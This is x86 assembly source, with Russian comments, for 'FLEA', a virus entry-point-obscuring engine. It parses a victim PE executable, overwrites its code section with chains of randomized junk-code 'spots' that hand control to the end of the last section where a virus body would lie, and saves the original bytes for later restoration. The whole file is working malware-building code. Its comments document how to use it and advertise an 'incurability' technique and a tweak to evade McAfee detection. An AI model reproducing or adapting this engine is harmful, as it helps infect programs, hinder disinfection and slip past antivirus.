;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;                                                                                                        ; 
;                                                                                                        ;
;                        xxxxxxxxxxx   xxxx          xxxxxxxxxxx     xxxxxxxxxx                          ; 
;                        xxxxxxxxxxx   xxxx          xxxxxxxxxxx    xxxx   xxxx                          ;
;                        xxxx          xxxx          xxxx          xxxx    xxxx                          ;
;                        xxxx          xxxx          xxxx          xxxx    xxxx                          ;
;                        xxxxxxxxx     xxxx          xxxxxxxxx     xxxx    xxxx                          ;
;                        xxxxxxxxx     xxxx          xxxxxxxxx     xxxx xx xxxx                          ;
;                        xxxx          xxxx          xxxx          xxxx xx xxxx                          ;
;                        xxxx          xxxx   xxxx   xxxx          xxxx    xxxx                          ;
;                        xxxx          xxxxxxxxxxx   xxxxxxxxxxx   xxxx    xxxx                          ;
;                        xxxx          xxxxxxxxxxx   xxxxxxxxxxx   xxxx    xxxx                          ;
;                                                                                                        ; 
;                                                                                                        ;   
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;                                         UEP ENGINE                                                     ;
;                                            FLEA                                                        ; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; 
;                                                                                                        ;
;                                           :)!                                                          ;
;                                                                                                        ; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;                                                                                                        ;
;                                       функция FLEA                                                     ;
;                                      уеп(уёб) движок                                                   ; 
;                                                                                                        ;
;                                                                                                        ;
;ВХОД:                                                                                                   ; 
;1 параметр (и единственный) - адрес структуры (UEPGEN) (ее описание смотри ниже)                        ;
;--------------------------------------------------------------------------------------------------------;
;ВЫХОД:                                                                                                  ;
;EAX - абсолютный виртуальный адрес точки входа                                                          ;
;(а также самое главное: запись пятен в кодовую секцию с последующим сохранением оригинальных байт       ; 
;--------------------------------------------------------------------------------------------------------;
;ЗАМЕТКИ:                                                                                                ;
;структура, указатель на которую передан в качестве параметра, не портится, т.е. данные в ней после      ;
;вызова данного движка остаются теми же.                                                                 ; 
;                                                                                                        ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;  
;                                                                                                        ;
;                                           !                                                            ;
;                                                                                                        ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; 
;                                                                                                        ;
;                                   ОПИСАНИЕ СТРУКТУРЫ                                                   ;
;                                        UEPGEN                                                          ;  
;                                                                                                        ;
;                                                                                                        ;
;UEPGEN struct                                                                                           ; 
;   rgen_addr           dd  ?   ;адрес Генератора Случайных Чисел (ГСЧ)                                  ;
;   tgen_addr           dd  ?   ;адрес Генератора Мусорных Инструкций                                    ;  
;   mapped_addr         dd  ?   ;база мэппинга файла (MapViewOfFile)                                     ; 
;   xsection            dd  ?   ;IMAGE_SECTION_HEADER секции, в которую после после передать управление  ; 
;   reserved1           dd  ?   ;зарезервировано                                                         ;  
;MORPHGEN   ends                                                                                         ;
;                                                                                                        ; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;                                                                                                        ;
;                                   ОПИСАНИЕ СТРУКТУРЫ                                                   ;
;                                         T2GEN                                                          ; 
;                                    (aka TRASHGEN)                                                      ; 
;                       (более детальное описание смотри в движке xTG)                                   ; 
;                                                                                                        ;
;                                                                                                        ;
;TRASHGEN   struct                                                                                       ;
;   rgen_addr       dd      ?   ;адрес Генератора Случайных Чисел (ГСЧ)                                  ;
;   buf_for_trash   dd      ?   ;адрес (буфер), куда записывать генерируемое (хех, качественное) дерьмо  ;
;   size_trash      dd      ?   ;размер (в байтах), сколько мусора записать                              ;
;   regs            dd      ?   ;занятые регистры (2 шт)                                                 ;
;   xmask1          dd      ?   ;64-битная маска для генерации                                           ;
;   xmask2          dd      ?   ;мусорных команд (ака фильтр)                                            ;
;   beg_addr        dd      ?   ;начальный адрес                                                         ;
;   end_addr        dd      ?   ;конечный адрес                                                          ;
;   mapped_addr     dd      ?   ;зарезервировано (либо база мэпинга (ака адрес файла в памяти))          ;      
;   reserv1         dd      ?   ;зарезервировано (хз, может когда-то там что и будет)                    ; 
;TRASHGEN   ends                                                                                         ;
;                                                                                                        ; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;                                                                                                        ;
;                                           !                                                            ;
;                                                                                                        ; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; 
;                                                                                                        ;
;                           ПОЯСНЕНИЕ К ПОЛЯМ СТРУКТУРЫ UEPGEN:                                          ;  
;                                                                                                        ;
;                                                                                                        ;
;[   rgen_addr   ] :                                                                                     ; 
;                    так как данный движок (FLEA) разработан без привязки к какому-либо другому мотору,  ;
;                    а для генерации мусора (и некоторых других фич) важен ГСЧ, поэтому адрес ГСЧ        ; 
;                    хранится в (данном) поле структуры.                                                 ;
;                    ВАЖНО: если мотор FLEA будет использовать другой ГСЧ (а не тот, который             ;
;                    идет с ним в комплекте), надо, чтобы этот другой ГСЧ принимал в качестве 1-го       ;
;                    (и единственного!) параметра в стэке число (назовем его N), так как поиск будет в   ;
;                    диапазоне [0..n-1]. И на выходе другой ГСЧ должен возвращать в EAX случайное число. ;  
;                    Остальные регистры должны остаться неизменными. Все.                                ; 
;--------------------------------------------------------------------------------------------------------; 
;[   tgen_addr   ] :                                                                                     ;
;                    аналогично, как и с предыдущим полем структуры. Только тогда генератор мусора       ;
;                    должен быть приведен к виду, как xTG (в ненужных полях можно передавать нули и все  ;
;                    тип-топ).                                                                           ;
;--------------------------------------------------------------------------------------------------------;
;[  mapped_addr  ] :                                                                                     ; 
;                    в этом поле хранится база мэппинга файла. Как пример, значение получаемое после     ; 
;                    вызова функи MapViewOfFile.                                                         ; 
;--------------------------------------------------------------------------------------------------------; 
;[   xsection    ] :                                                                                     ;   
;                    здесь передавать либо 0, либо IMAGE_SECTION_HEADER (в жертве) той секции, в         ; 
;                    которую после отработки должен будет передать управление данный uep-движок.         ; 
;                    Если здесь 0, то управление будет передано в конец последней секции.                ;  
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;                         
;                                                                                                        ;
;                                          ЗАМЕТКИ                                                       ;
;                                                                                                        ;
;                                                                                                        ;
;1) для сокрытия точки входа (то есть для генерации пятен) следует вызвать (главную) функцию FLEA.       ;
;2) для восстановления ранее сохраненных байт следует вызвать FLEA_RESTBYTES (возможно потребуется       ;
;   нужному участку памяти задать атрибуты страниц на чтение+запись).                                    ;
;3) так как пятна представляют собой подфункции (с прологом, эпилогом, командой ret), и переход к        ;
;   следующему пятну осуществляется с помощью CALL'ов, то в стэке лежат разные значения. И чтобы после   ;
;   стэк сбалансировать, следует вызвать FLEA_RESTSTACK. ВАЖНО: перед вызовом функции FLEA_RESTSTACK,    ;
;   в стэке не должно быть уже никаких других данных.                                                    ;
;                                                                                                        ; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; 
;                                                                                                        ;
;                                           y0p!                                                         ;
;                                                                                                        ;  
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;                                                                                                        ;
;                                           ФИЧИ                                                         ;
;                                                                                                        ;
;                                                                                                        ;
;(+) генерация рандомного числа пятен                                                                    ; 
;                                                                                                        ;
;(+) пятна имеют рандомный размер, а также разный переход по пятнам (сверху вниз и наоборот)             ;
;                                                                                                        ;
;(+) техника неизлечимости                                                                               ; 
;                                                                                                        ;
;(+) использование ГСЧ и Генератора Мусора (особенно своих, так это вообще охуительно)                   ; 
;                                                                                                        ;
;(+) базонезависимость                                                                                   ;
;                                                                                                        ; 
;(+) пятна выглядят как подфункции (с прологом, эпилогом, командой ret, а также возможно и fake winapi)  ;
;                                                                                                        ;  
;(+) нет привязки к другим движкам (ГСЧ & trashgen можно юзать любой - условия читай выше;)              ; 
;       * можно компилить как самостоятельный модуль;                                                    ;            
;                                                                                                        ;
;(+) не юзает WinAPI                                                                                     ;
;                                                                                                        ;
;(+) управление можно передавать на любую секцию после отработки uep-движка (также опционально)          ; 
;                                                                                                        ; 
;(x) использует данные и дельта-смещение.                                                                ;  
;                                                                                                        ;              
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;                                                                                                        ;
;                                           y0p!                                                         ;
;                                                                                                        ; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;                                                                                                        ;
;                                       ИСПОЛЬЗОВАНИЕ:                                                   ;
;                                                                                                        ;
;                                                                                                        ;
;1) Подключение:                                                                                         ;
;       FLEA.asm                                                                                         ; 
;2) Вызов (пример stdcall):                                                                              ;
;       ...                                                                                              ;
;       szBuf       db 100      dup (00h)                                                                ; 
;       ...                                                                                              ;
;       lea     ecx,szBuf                                                                                ;
;       assume  ecx:ptr UEPGEN                                                                           ;      
;       mov     [ecx].rgen_addr,00401000h       ;по этому адресу должен находиться ГСЧ                   ;
;       mov     [ecx].tgen_addr,00401300h       ;по этому адресу должен находиться трэшген               ; 
;       mov     [ecx].mapped_addr,00330000h     ;по этому адресу находится база мэппинга                 ;  
;       mov     [ecx].xsection,0                ;ставим в ноль, значит уеп после передаст управление     ; 
;                                               ;на конец последней секции                               ;  
;                                               ;остальные параметры обнулены.                           ;
;       call    FLEA                            ;вызываем полиморфный движок                             ;  
;                                                                                                        ; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; 
;v1.0 
;коменты обычно пишутся ночью, поэтому возможен бредняк в них. 
 


                                                        ;m1x
                                                    ;pr0mix@mail.ru
                                                ;EOF 
                                                                                                  
                                                                                                    





;========================================================================================================
;структуры
;========================================================================================================
UEPGEN  struct
    rgen_addr       dd      ?
    tgen_addr       dd      ? 
    mapped_addr     dd      ?
    xsection        dd      ? 
    reserved1       dd      ? 
UEPGEN  ends 
;--------------------------------------------------------------------------------------------------------  
T2GEN   struct                                                                                           ;
    rgen_addr       dd      ?   ;адрес Генератора Случайных Чисел (ГСЧ)                                  ;
    buf_for_trash   dd      ?   ;адрес (буфер), куда записывать генерируемое (хех, качественное) дерьмо  ;
    size_trash      dd      ?   ;размер (в байтах), сколько мусора записать                              ;
    regs            dd      ?   ;занятые регистры (2 шт)                                                 ;
    xmask1          dd      ?   ;64-битная маска для генерации                                           ;
    xmask2          dd      ?   ;мусорных команд (ака фильтр)                                            ;
    beg_addr        dd      ?   ;начальный адрес                                                         ;
    end_addr        dd      ?   ;конечный адрес                                                          ;
    mapped_addr     dd      ?   ;база мэпинга                                                            ; 
    reserv1         dd      ?   ;зарезервировано (хз, может когда-то там что и будет)                    ; 
T2GEN   ends                                                                                             ;
;========================================================================================================




MAX_SPOTS           equ     10                  ;максимальное кол-во генерируемых пятен             
uportion1           equ     85                  ;размер (в байтах) 1-ой порции мусора 
uportion2           equ     50                  ;размер (в байтах) 2-ой порции мусора
MIN_FIRST_PORTION   equ     uportion1-30        ;генерировать первую порцию мусора не меньше данного кол-ва байт    
min_jmp             equ     uportion1+uportion2+7+10+30 ;расстояние минимальное  
max_jmp             equ     min_jmp+200         ;расстояние максимальное 

                                                ;далее идут значения для трэшгена
begin_address       equ     0                   ;начальный адрес (описание смотри в xTG.asm, либо ставь нули) 
end_address         equ     0                   ;конечный адрес
mask_trash1         equ     00000000000011111111110101111001b ;маска для мусора 
mask_trash2         equ     011110000b          ;2-ая часть маски (разрешаем только генерацию фэйковых апишек)  


 


FLEA:                                           ;движок FLEA   
    pushad                                      ;сохраняем регистры 
    cld 
    mov     ebp,esp                             ;[ebp+00] 
    mov     ebx,dword ptr [ebp+24h] 
    assume  ebx:ptr UEPGEN                      ;ebx - указатель на структуру UEPGEN
    mov     esi,[ebx].mapped_addr      
    assume  esi:ptr IMAGE_DOS_HEADER
    add     esi,[esi].e_lfanew
    push    esi                                 ;[ebp-04] ;сохраняем указатель на IMAGE_NT_HEADERS 
    lodsd
    assume  esi:ptr IMAGE_FILE_HEADER
    movzx   ecx,[esi].NumberOfSections
    movzx   edx,[esi].SizeOfOptionalHeader
    add     esi,sizeof IMAGE_FILE_HEADER 
    assume  esi:ptr IMAGE_OPTIONAL_HEADER 
    push    [esi].AddressOfEntryPoint           ;[ebp-08] ;сохраняем точку входа 
    push    [esi].ImageBase                     ;[ebp-12] ;сохраняем базу 
    add     esi,edx 
    assume  esi:ptr IMAGE_SECTION_HEADER
    sub     esp,(sizeof T2GEN + 4 + 80)         ;выделяем в стэке место для временных переменных и структуры T2GEN (aka TRASHGEN) 
    mov     tgen_struct,esp
    mov     edx,esp
    assume  edx:ptr T2GEN
;-------------------------------------------------------------------------------------------------------- 
    push    mask_trash1                         ;пофильтруем маску для генерации трэша  
    call    gen_mask
    or      al,1 
    mov     xtmask1,eax   
    push    mask_trash2
    call    gen_mask 
    or      eax,01110000b          
    mov     xtmask2,eax 
;--------------------------------------------------------------------------------------------------------    
    push    [ebx].rgen_addr                     ;вначале заполним некоторые поля структуры TRASHGEN 
    pop     [edx].rgen_addr
    mov     [edx].regs,0FFh
    push    xtmask1
    pop     [edx].xmask1
    push    xtmask2 
    pop     [edx].xmask2
    mov     [edx].beg_addr,begin_address
    mov     [edx].end_addr,end_address
    push    [ebx].mapped_addr
    pop     [edx].mapped_addr   
    xor     eax,eax 
    cdq                       
;--------------------------------------------------------------------------------------------------------
_search_new_ep_:                                ;далее начинаем поиск кодовой секции 
    cmp     edx,[esi].VirtualAddress
    ja      _search_code_sec_
    cmp     eax,[esi].PointerToRawData 
    ja      _search_code_sec_    
    mov     edx,[esi].VirtualAddress            ;а также сохраним новую точку входа (она будет указывать на конец последней секции)      
    mov     eax,[esi].PointerToRawData
    mov     edi,[esi].SizeOfRawData
    mov     new_ep,edx
    add     new_ep,edi 
;--------------------------------------------------------------------------------------------------------
_search_code_sec_:
    push    eax 
    mov     eax,old_ep
    mov     edi,[esi].VirtualAddress 
    cmp     edi,eax;old_ep
    ja      _nextsection_
    cmp     [esi].Misc.VirtualSize,0
    jne     _vsok_
    add     edi,[esi].SizeOfRawData   
    jmp     _psok_
_vsok_:
    add     edi,[esi].Misc.VirtualSize
_psok_:  
    cmp     edi,eax  
    jbe     _nextsection_  
    sub     eax,[esi].VirtualAddress
    add     eax,[esi].PointerToRawData 
    add     eax,[ebx].mapped_addr   
    mov     start_addr,eax                      ;если нашли кодовую секцию, то сохраним физический адрес точки входа, т.к. отсюда и начнем клепать пятна    
    mov     codesec,esi                         ;а также сохраним аказатель в табличке секций на кодовую секцию  
_nextsection_: 
    pop     eax
    add     esi,sizeof IMAGE_SECTION_HEADER
    loop    _search_new_ep_ 
;--------------------------------------------------------------------------------------------------------
    mov     esi,codesec                         ;после вычислим конец кодовой секции 
    mov     eax,[esi].SizeOfRawData 
    cmp     eax,[esi].Misc.VirtualSize
    jbe     _sizecsok_
    cmp     [esi].Misc.VirtualSize,0 
    je      _sizecsok_ 
    mov     eax,[esi].Misc.VirtualSize
     
_sizecsok_:
    add     eax,[esi].VirtualAddress        
    sub     eax,old_ep
    mov     size_codesec,eax
    add     eax,old_ep
    mov     max_codesec_addr,eax  
    mov     edi,imNTh
    assume  edi:ptr IMAGE_NT_HEADERS
;--------------------------------------------------------------------------------------------------------    
_maxvacs_:                                      ;далее, найдем максимальный адрес, и получится отрезок:
                                                ;[физич. адрес точки входа ; максимальный адрес в кодовой секции] 
                                                ;и в этом отрезке будем записывать пятна. Иначе в кодовой секции могут быть директории импорта, tls и т.д.
                                                ;И если мы перепишем их своими пятнами, то будет пыцдэт файлу 
    mov     eax,[edi].OptionalHeader.DataDirectory[ecx*8].VirtualAddress    
    cmp     old_ep,eax
    ja      _nextdatadir_  
    cmp     max_codesec_addr,eax 
    jb      _nextdatadir_ 
    mov     max_codesec_addr,eax  
_nextdatadir_:    
    inc     ecx
    cmp     ecx,15
    jne     _maxvacs_
;--------------------------------------------------------------------------------------------------------
    mov     eax,max_codesec_addr      
    sub     eax,[esi].VirtualAddress
    add     eax,[esi].PointerToRawData
    add     eax,[ebx].mapped_addr  
    mov     max_codesec_addr,eax                ;получаем максимальный физический адрес в кодовой секции  
                                                ;Так, теперь диапазон у нас есть 
    mov     eax,start_addr
    mov     cur_codesec_addr,eax

    push    MAX_SPOTS
    call    [ebx].rgen_addr                     ;рэндомно получаем, сколько пятен сгенерим и запишем в кодовую секцию  
    inc     eax  
    mov     num_spots,eax
       
    call    _delta_uep_
_delta_uep_:
    pop     eax
    sub     eax,_delta_uep_
    lea     ecx,[restore_bytes+eax]
    mov     beg_rest_bytes,ecx                  ;в этот буфер будем сохранять оригинальные байты из кодовой секции (которые перепишем пятнами) 
     
    xor     ecx,ecx     
;-------------------------------------------------------------------------------------------------------- 
_nextaddrforspots_:       
    call    get_jmpaddr                         ;получим адрес очередного пятна, на которое прыгнем  
    add     eax,cur_codesec_addr
    push    eax                                   
    add     eax,(uportion1+uportion2+7+10)      ;прибавим 2 порции мусора + max размер (mov reg,<address>   call reg) (7 byte) + размер пролога и эпилога для каждого пятнышка (6 byte  + 3 byte) + размер команды ret (+1 byte)              
    cmp     eax,max_codesec_addr                ;и сравним с максимальный допустимым адресом  
    pop     eax 
    jae     _alladdrforspots_                   ;если больше макс. адреса, то пятна больше не варик генерить, и выходим из цикла 
    push    eax                                 ;иначе сохраняем в стэке адрес   
    mov     cur_codesec_addr,eax                ;сделаем текущим адресом проверки адрес для нового пятна  
    inc     ecx
    cmp     ecx,num_spots
    jne     _nextaddrforspots_
_alladdrforspots_:
    mov     num_spots,ecx                       ;сохраним кол-во пятен, которые точно можно записать в кодовой секции 
;--------------------------------------------------------------------------------------------------------
    cmp     cl,1  
    push    0
    pop     eax
    jb      _enduep_                            ;если ноль пятен, то выходим из движка      
    mov     eax,esp  
    push    start_addr                          ;будем перемешивать все полученные адреса пятен, кроме первого  
    je      _nomixaddr_       
;--------------------------------------------------------------------------------------------------------        
    push    ecx
    push    eax
    call    mix_addr                            ;перемешаем адреса пятен 

_nomixaddr_:    
    xor     edx,edx
    mov     edi,beg_rest_bytes
    stosb                                       ;в 1-ом байте будет храниться кол-во пятен. Пока пропустим его 
    mov     cur_rest_bytes,edi 
;-------------------------------------------------------------------------------------------------------- 
_genspot_:
    mov     edi,cur_rest_bytes  
_portion1_: 
    push    uportion1 
    call    [ebx].rgen_addr
    cmp     eax,MIN_FIRST_PORTION
    jb      _portion1_                       
    mov     spot1,eax
    xchg    eax,ecx
    push    uportion2
    call    [ebx].rgen_addr
    mov     spot2,eax
    add     ecx,eax 
    add     ecx,(7+10)                          ;max_size (mov reg,<address>   call reg) (7 byte) + prologue (6 byte) + epilogue (3 byte) + ret (1 byte)    
    mov     eax,ecx
    stosd                                       ;сначала сохраним в спец. буфере размер очередного пятна (это 1-ая порция мусора + jmp + 2-ая порция мусора)  
    mov     eax,dword ptr [esp]
    mov     esi,codesec
    sub     eax,[ebx].mapped_addr 
    sub     eax,[esi].PointerToRawData
    add     eax,[esi].VirtualAddress
    add     eax,base
    stosd                                       ;и сохраним следом абослютный виртуальный адрес, куда после будем восстанавливать ранее сохраненные байты        
    mov     esi,dword ptr [esp] 
    rep     movsb                               ;а после сохраним байты, на место которых запишем пятно 
    mov     cur_rest_bytes,edi
    pop     edi 
    push    edx
    mov     edx,tgen_struct   
;--------------------------------------------------------------------------------------------------------    
    mov     [edx].buf_for_trash,edi 
    mov     [edx].size_trash,6                  ;размер пролога   
    mov     [edx].xmask1,0b
    mov     [edx].xmask2,100b                   ;в маске разрешаем генерацию только пролога (для другого генератора мусора здесь возможна генерация порции мусора)   
    push    edx
    call    [ebx].tgen_addr                     ;запишем пролог (push ebp   mov ebp,esp   sub esp,0xXX)           
    push    xtmask1
    pop     [edx].xmask1
    push    xtmask2
    pop     [edx].xmask2  
;--------------------------------------------------------------------------------------------------------    
    mov     [edx].buf_for_trash,eax 
    mov     eax,spot1 
    mov     [edx].size_trash,eax
    push    edx
    call    [ebx].tgen_addr                     ;запишем первую порцию мусора       
    xchg    eax,edi
    push    edi
    add     edi,5
    mov     eax,dword ptr [esp+04]
    cmp     eax,num_spots                       ;проверим, остался последний адрес для записи пятна?
    jne     _nextspot_                          ;если да, тогда запишем финальное пятно, jmp в котором будет указывать на последнюю секцию, а не на очередное пятно 
;******************************************************************************************************** 
comment %       
                                                ;запись финального пятна 
    mov     esi,codesec                         ;с помощью нехитрой формулы посчитаем операнд для jmp (0xE9)                            
    sub     edi,[ebx].mapped_addr
    sub     edi,[esi].PointerToRawData
    add     edi,[esi].VirtualAddress
    mov     ecx,[ebx].xsection
    jecxz   _notxsec_
    assume  ecx:ptr IMAGE_SECTION_HEADER 
    sub     edi,[ecx].VirtualAddress
    sub     edi,[ecx].SizeOfRawData             ;здесь строим call near (0xE8 0xXX 0xXX 0xXX 0xXX)   
    jmp     _finalcall_
_notxsec_: 
    sub     edi,new_ep
_finalcall_:
    neg     edi
    xchg    edi,dword ptr [esp]
    mov     al,0E8h ;0E9h                       ;CALL NEAR 0xXXXXXXXX (0xE8 0xXX 0xXX 0xXX 0xXX)   
    stosb
    pop     eax
    stosd 
        ;%
                          
;comment !                                      ;for mcafe
    mov     edi,new_ep 
    mov     ecx,[ebx].xsection
    jecxz   _notxsec_                           ;если поле пустое, значит управление после уепа передаем в конец последней секции  
    assume  ecx:ptr IMAGE_SECTION_HEADER
    mov     edi,[ecx].VirtualAddress
    add     edi,[ecx].SizeOfRawData    
_notxsec_:
    add     edi,base                            ;а здесь строим   
    xchg    edi,dword ptr [esp]
    mov     al,0B8h                             ;mov    reg32,<address>
    stosb
    pop     eax
    stosd
    mov     al,0FFh                             ;call   reg32 
    stosb
    mov     al,0D0h
    stosb 
        ;!   
    mov     [edx].buf_for_trash,edi
    mov     eax,spot2
    mov     [edx].size_trash,eax
    push    edx
    call    [ebx].tgen_addr                     ;2-ая порция мусора для финального пятна 
;--------------------------------------------------------------------------------------------------------
    mov     [edx].buf_for_trash,eax  
    mov     [edx].size_trash,3                  ;размер эпилога  
    mov     [edx].xmask1,0b
    mov     [edx].xmask2,1000b                  ;в маске разрешаем генерацию только эпилога (для другого генератора мусора здесь возможна генерация очередной порции мусора)     
    push    edx
    call    [ebx].tgen_addr                     ;запишем эпилог для финального пятна (mov esp,ebp   pop ebp)           
    mov     byte ptr [eax],0C3h                 ;и запишем ret    
;-------------------------------------------------------------------------------------------------------- 
    pop     edx  
    jmp     _endspot_                           ;выходим из цикла  
;********************************************************************************************************  
                                                ;запись очередного пятна 
_nextspot_: 
    sub     edi,dword ptr [esp+08]              ;следующий адрес
    neg     edi
    xchg    edi,dword ptr [esp]
    mov     al,0E8h                             ;CALL NEAR (0xE8 0xXX 0xXX 0xXX 0xXX)   
    stosb
    pop     eax
    stosd 
    mov     [edx].buf_for_trash,edi
    mov     eax,spot2
    mov     [edx].size_trash,eax
    push    edx
    call    [ebx].tgen_addr                     ;2 порция мусора для очередного пятнышка 
;-------------------------------------------------------------------------------------------------------- 
    mov     [edx].buf_for_trash,eax  
    mov     [edx].size_trash,3                  ;размер эпилога  
    mov     [edx].xmask1,0b
    mov     [edx].xmask2,1000b                  ;в маске разрешаем генерацию только эпилога (для другого генератора мусора здесь возможна генерация очередной порции мусора)    
    push    edx
    call    [ebx].tgen_addr                     ;запишем эпилог для очередного пятна (mov ebp,esp   pop ebp)           
    mov     byte ptr [eax],0C3h                 ;и запишем ret 
;--------------------------------------------------------------------------------------------------------     
    pop     edx
    inc     edx
    jmp     _genspot_  
;-------------------------------------------------------------------------------------------------------- 
_endspot_: 
    mov     edi,beg_rest_bytes 
    mov     eax,num_spots                       ;корректируем кол-во записанных пятен (т.к. до этого мы не посчитали 1-ого пятна, которое всегда записывается в точке входа) 
    inc     eax
    stosb
    mov     eax,start_addr
    mov     esi,codesec
    sub     eax,[ebx].mapped_addr
    sub     eax,[esi].PointerToRawData
    add     eax,[esi].VirtualAddress   
    add     eax,base 
;-------------------------------------------------------------------------------------------------------- 
_enduep_:  
    mov     esp,ebp  
    mov     dword ptr [ebp+1Ch],eax             ;результат в EAX   
    popad 
    ret     4
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец дфункции/движка FLEA 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx     






;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;функция FLEA_RESTBYTES
;восстановление ранее сохраненных байт (на свои места)
;ВЫХОД:
;    - делает свое дело :)
;EAX - кол-во сгенерированных пятен (на места которых восстановим ранее сохраненные байты) 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
FLEA_RESTBYTES:  
    pushad  
    cld 
    call    _delta_ueprest_
_delta_ueprest_:
    pop     eax
    sub     eax,_delta_ueprest_ 
    lea     esi,[restore_bytes+eax]
    push    esi 
    xor     eax,eax 
    lodsb
    xchg    eax,ebx                             ;сохраняем в EBX кол-во записанных пятен    
    mov     edx,ebx 
_nextrestspot_: 
    lodsd
    xchg    eax,ecx                             ;сохраняем в ECX размер очередного пятна 
    lodsd
    xchg    eax,edi                             ;сохраняем в EDI адрес, где находится очередное пятно 
    rep     movsb                               ;и запишем на место этого пятна оригинальные (ранее сохраненные) байты 
    dec     ebx
    jne     _nextrestspot_
    pop     eax
    sub     esi,eax
    xchg    eax,esi
    mov     dword ptr [esp+1Ch],edx   
    popad
    ret   
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функции FLEA_REST 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 





;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;функция FLEA_RESTSTACK
;сбаланирование стэка после после пятен 
;ВХОД (stdcall) (FLEA_RESTSTACK(DWORD num_spots)):
;num_spots - количество отработанных в жертве пятен 
;            (это значение можно получить из буфера restore_bytes)      
;ВЫХОД: 
;балансировка стэка, а также в ECX=0, EAX = адрес команды, которая выполняется сразу после вызова данной 
;функции (FLEA_RESTSTACK); 
;ЗАМЕТКИ:
;   так как каждое пятно меняло регистр EBP и ESP (клало EBP  в стэк, а также адрес, следующий за 
;   CALL'ом), то надо восстановить данные регистры, и соответственно стэк.
;   ВАЖНО: вызывать эту функцию только тогда, когда в стэке вы уже не храните никакие данные.   
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
FLEA_RESTSTACK:
    pop     eax 
    pop     ecx   
_reststack_: 
    add     esp,4                               ;pop    edx 
    mov     esp,ebp
    pop     ebp
    loop    _reststack_
    jmp     eax
